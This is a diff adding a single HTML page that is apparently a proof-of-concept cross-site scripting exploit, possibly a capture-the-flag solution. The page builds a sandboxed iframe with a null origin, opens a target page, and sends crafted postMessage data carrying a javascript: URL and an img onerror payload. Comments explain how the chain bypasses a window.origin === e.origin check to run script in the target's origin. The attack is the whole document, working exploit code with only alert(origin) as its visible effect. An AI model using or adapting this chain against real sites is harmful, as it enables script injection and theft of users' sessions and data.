@@ -1,0 +1,29 @@
+
+<body>
+    <script>
+      f = document.createElement('iframe');
+      
+      // Needed flags
+      f.sandbox = 'allow-modals allow-forms allow-popups allow-scripts allow-same-origin';
+      
+      // Second communication with /iframe.php (this is the top page relocated)
+      // This will execute the alert in the correct origin
+      payload = `x=open('http://somewebsite.com/index.html');setTimeout(()=>{x.postMessage(JSON.stringify({type: 'readyToPlay', goto: 'javascript:alert(origin)'}), '*');},1000);`
+      // Initial communication
+      // Open /iframe.php in a popup, both iframes and popup will have "null" as origin
+      // Then, bypass window.origin === e.origin to steal the identifier and communicate
+      // with the top with the second XSS payload
+      f.srcdoc = `
+      <h1>Click me!</h1>
+      <script>
+        onclick = e => {
+          let w = open('http://somewebsite.com/index.html');
+          setTimeout(_ => {
+            w.postMessage(JSON.stringify({"readyToPlay": true, "goto": "javascript:'<img src=x onerror=\\"${payload}\\">'"}), '*')
+          }, 1000);
+        };
+      <\/script>
+      `
+      document.body.appendChild(f);
+    </script>
+  </body>
